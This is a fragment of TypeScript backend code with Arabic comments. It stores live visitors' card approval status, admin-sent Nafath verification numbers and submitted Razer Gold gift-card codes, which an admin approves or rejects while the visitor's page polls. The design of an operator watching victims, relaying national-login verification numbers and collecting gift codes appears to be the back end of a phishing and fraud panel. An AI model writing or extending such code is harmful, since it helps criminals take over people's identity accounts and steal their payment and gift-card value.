export async function setVisitorNafathNumber(
  sessionId: string,
  nafathNumber: string | null
): Promise<void> {
  const db = await getDb();
  if (!db) return;
  await db
    .update(liveVisitors)
    .set({
      nafathNumber,
      nafathSentAt: nafathNumber ? new Date() : null,
    })
    .where(eq(liveVisitors.sessionId, sessionId));
}

/** جلب حالة البطاقة ورقم نفاذ وحالة Razer لزائر واحد (للـ polling) */
export async function getVisitorControlState(sessionId: string): Promise<{
  cardStatus: "pending" | "approved" | "rejected" | null;
  nafathNumber: string | null;
  nafathSentAt: Date | null;
  razerStatus: "pending" | "approved" | "rejected" | null;
} | null> {
  const db = await getDb();
  if (!db) return null;
  const rows = await db
    .select({
      cardStatus: liveVisitors.cardStatus,
      nafathNumber: liveVisitors.nafathNumber,
      nafathSentAt: liveVisitors.nafathSentAt,
      razerStatus: liveVisitors.razerStatus,
    })
    .from(liveVisitors)
    .where(eq(liveVisitors.sessionId, sessionId))
    .limit(1);
  if (rows.length === 0) return null;
  return {
    cardStatus: rows[0].cardStatus ?? null,
    nafathNumber: rows[0].nafathNumber ?? null,
    nafathSentAt: rows[0].nafathSentAt ?? null,
    razerStatus: rows[0].razerStatus ?? null,
  };
}

/** حفظ كود Razer Gold للزائر (upsert - يعمل حتى لو لم يكن هناك سجل سابق) */
export async function setVisitorRazerCode(
  sessionId: string,
  razerCode: string
): Promise<void> {
  const db = await getDb();
  if (!db) return;
  // تحقق من وجود السجل أولاً
  const existing = await db.select({ id: liveVisitors.id }).from(liveVisitors).where(eq(liveVisitors.sessionId, sessionId)).limit(1);
  if (existing.length > 0) {
    // تحديث السجل الموجود
    await db
      .update(liveVisitors)
      .set({
        razerCode,
        razerStatus: "pending",
        razerSubmittedAt: new Date(),
      })
      .where(eq(liveVisitors.sessionId, sessionId));
  } else {
    // إنشاء سجل جديد إذا لم يكن موجوداً (الزائر دخل مباشرة على صفحة الدفع)
    await db.insert(liveVisitors).values({
      sessionId,
      currentPage: "/razer-payment",
      razerCode,
      razerStatus: "pending",
      razerSubmittedAt: new Date(),
      lastSeen: new Date(),
      firstSeen: new Date(),
      pageEnteredAt: new Date(),
    });
  }
}

/** تحديث حالة كود Razer Gold (قبول/رفض) - أدمن فقط */
export async function setVisitorRazerStatus(
  sessionId: string,
  status: "pending" | "approved" | "rejected" | null
): Promise<void> {
  const db = await getDb();
  if (!db) return;
  await db
    .update(liveVisitors)
    .set({ razerStatus: status })
    .where(eq(liveVisitors.sessionId, sessionId));
}
